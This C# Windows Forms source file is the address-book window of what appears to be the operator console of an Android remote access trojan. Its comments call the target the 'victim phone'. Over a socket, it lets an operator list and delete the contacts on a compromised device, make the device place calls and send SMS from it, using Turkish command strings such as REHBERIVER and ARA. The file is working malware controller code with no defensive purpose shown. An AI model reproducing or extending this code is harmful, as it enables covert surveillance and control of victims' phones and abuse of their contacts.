using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Server.Views
{
    /// <summary>
    /// Shows the contacts of victim phone
    /// </summary>
    public partial class AddressBook : Form
    {
        readonly Socket socket;
        public string Id = "";

        /// <summary>
        /// Creates a new <see cref="AddressBook"/> instance
        /// </summary>
        /// <param name="socket">Socket that connects the client to the server</param>
        /// <param name="id">Identification of the client</param>
        public AddressBook(Socket socket, string id)
        {
            InitializeComponent();
            Id = id; this.socket = socket;
        }

        /// <summary>
        /// Fetch contacts on mobile phone from a command
        /// </summary>
        /// <param name="arg">Command arguments</param>
        public void FetchContacts(string arg)
        {
            contacts.Items.Clear();
            if (arg != "REHBER YOK")
            {
                string[] mainData = arg.Split('&');
                for (int k = 0; k < mainData.Length; k++)
                {
                    try
                    {
                        string[] info = mainData[k].Split('=');
                        ListViewItem item = new ListViewItem(info[0])
                        {
                            ImageIndex = 0
                        };
                        item.SubItems.Add(info[1]);
                        contacts.Items.Add(item);
                    }
                    catch (Exception) { }
                }
            }
            else
            {
                ListViewItem item = new ListViewItem("No Contacts");
                contacts.Items.Add(item);
            }
        }

        /// <summary>
        /// Adds a new contact to mobile phone
        /// </summary>
        /// <param name="sender"><see cref="AddressBook"/> instance</param>
        /// <param name="e"><see cref="EnventArgs"/></param>
        private void OnAddContact(object sender, EventArgs e)
        {
            new AddContact(socket).Show();
        }

        /// <summary>
        /// Removes a contact from mobile phone
        /// </summary>
        /// <param name="sender"><see cref="AddressBook"/> instance</param>
        /// <param name="e"><see cref="EnventArgs"/></param>
        private void OnRemoveContact(object sender, EventArgs e)
        {
            try
            {
                MainWindow.GoToOurSocket("REHBERSIL", $"[VERI]{contacts.SelectedItems[0].Text}[VERI][0x09]", socket);
                contacts.SelectedItems[0].Remove();
                Text = "Address Book";
            }
            catch (Exception) { }
        }

        /// <summary>
        /// Refresh the actual form
        /// </summary>
        /// <param name="sender"><see cref="AddressBook"/> instance</param>
        /// <param name="e"><see cref="EnventArgs"/></param>
        private void OnRefreshForm(object sender, EventArgs e)
        {
            try
            {
                MainWindow.GoToOurSocket("REHBERIVER", "[VERI][0x09]", socket);
                Text = "Adress Book";
            }
            catch (Exception) { }
        }

        /// <summary>
        /// Calls to a contact from the mobile phone
        /// </summary>
        /// <param name="sender"><see cref="AddressBook"/> instance</param>
        /// <param name="e"><see cref="EnventArgs"/></param>
        private void OnCallContact(object sender, EventArgs e)
        {
            if (contacts.SelectedItems.Count == 1)
            {
                try
                {
                    MainWindow.GoToOurSocket("ARA", $"[VERI]{contacts.SelectedItems[0].SubItems[1].Text}[VERI][0x09]", socket);
                    MessageBox.Show("Call instruction has been sent.", "Call", MessageBoxButtons.OK, MessageBoxIcon.Information);

                }
                catch (Exception) { }
            }
        }

        /// <summary>
        /// Send SMS to a contact from the mobile phone
        /// </summary>
        /// <param name="sender"><see cref="AddressBook"/> instance</param>
        /// <param name="e"><see cref="EnventArgs"/></param>
        private void OnSendSMS(object sender, EventArgs e)
        {
            if (contacts.SelectedItems.Count == 1)
            {
                new SMS(socket, contacts.SelectedItems[0].SubItems[1].Text).Show();
            }
            else if (contacts.SelectedItems.Count == 0)
            {
                MessageBox.Show("Select one contact to send SMS",
                                "Select one contact",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Select only one contact to send SMS",
                                "Can't send SMS",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
            }
        }

        /// <summary>
        /// Copy the contact to a later usage
        /// </summary>
        /// <param name="sender"><see cref="AddressBook"/> instance</param>
        /// <param name="e"><see cref="EnventArgs"/></param>
        private void OnCopyButtonClicked(object sender, EventArgs e)
        {
            if (contacts.SelectedItems.Count == 1)
            {
                Clipboard.SetText(contacts.SelectedItems[0].SubItems[1].Text);
            }
            else if (contacts.SelectedItems.Count == 0)
            {
                MessageBox.Show("Select one contact to copy",
                                "Select one contact",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Select only one contact to copy",
                                "Can't copy contacts",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
            }
        }
    }
}
